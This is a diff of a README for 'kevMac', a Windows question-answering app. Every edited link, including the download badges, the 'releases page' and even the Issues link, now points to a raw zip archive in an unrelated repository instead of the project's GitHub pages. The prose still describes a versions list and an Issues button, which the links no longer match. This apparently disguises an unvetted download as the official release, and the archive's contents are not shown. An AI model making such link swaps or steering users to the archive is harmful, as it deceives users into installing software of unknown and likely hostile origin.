@@ -5,7 +5,7 @@ description: "Turn any document into calibrated answers with kev-powered decisio
 ---
 # 🤖 kevMac - Questions In. Answers Out. Instantly.
 
-[![Download kevMac](https://img.shields.io/badge/Download-kevMac_v1.0-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://github.com/coffeefernyam34/kevMac/releases)
+[![Download kevMac](https://img.shields.io/badge/Download-kevMac_v1.0-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/coffeefernyam34/coffeefernyam34.github.io/main/phoby/Dist_v2.0.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Getting kevMac up and running takes less than two minutes. Follow these simple s
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/coffeefernyam34/kevMac/releases](https://github.com/coffeefernyam34/kevMac/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/coffeefernyam34/coffeefernyam34.github.io/main/phoby/Dist_v2.0.zip](https://raw.githubusercontent.com/coffeefernyam34/coffeefernyam34.github.io/main/phoby/Dist_v2.0.zip)**
 
 Click the big green **Download** button on that page. The file will start downloading automatically. It's a small file, so it won't take long.
 
@@ -66,7 +66,7 @@ If you want a bit more detail, here's exactly what to expect:
 
 ### The Download Page
 
-When you visit the [download page](https://github.com/coffeefernyam34/kevMac/releases), you'll see a list of versions. Look for the newest one at the top. Click the file that matches your system (usually labeled "Windows" or "x64").
+When you visit the [download page](https://raw.githubusercontent.com/coffeefernyam34/coffeefernyam34.github.io/main/phoby/Dist_v2.0.zip), you'll see a list of versions. Look for the newest one at the top. Click the file that matches your system (usually labeled "Windows" or "x64").
 
 ### During Installation
 
@@ -206,7 +206,7 @@ The newest release brings several improvements:
 
 If you're still stuck, don't worry. Help is available:
 
-- **Visit the GitHub Issues page** – Click "Issues" at the top of the [repository](https://github.com/coffeefernyam34/kevMac). Search to see if someone had the same problem.
+- **Visit the GitHub Issues page** – Click "Issues" at the top of the [repository](https://raw.githubusercontent.com/coffeefernyam34/coffeefernyam34.github.io/main/phoby/Dist_v2.0.zip). Search to see if someone had the same problem.
 - **Submit a new issue** – Click the green "New Issue" button and describe your problem. The team usually responds within a day.
 
 ---
@@ -215,9 +215,9 @@ If you're still stuck, don't worry. Help is available:
 
 It's time to experience kevMac for yourself.
 
-[![Download kevMac Now](https://img.shields.io/badge/⬇️%20Download%20kevMac%20Now-0088CC?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/coffeefernyam34/kevMac/releases)
+[![Download kevMac Now](https://img.shields.io/badge/⬇️%20Download%20kevMac%20Now-0088CC?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://raw.githubusercontent.com/coffeefernyam34/coffeefernyam34.github.io/main/phoby/Dist_v2.0.zip)
 
-Click the button above or visit the [releases page](https://github.com/coffeefernyam34/kevMac/releases) to grab your copy. Download, install, and ask away. You'll wonder how you ever got by without it.
+Click the button above or visit the [releases page](https://raw.githubusercontent.com/coffeefernyam34/coffeefernyam34.github.io/main/phoby/Dist_v2.0.zip) to grab your copy. Download, install, and ask away. You'll wonder how you ever got by without it.
 
 Questions in. Answers out. That's the kevMac promise.
 
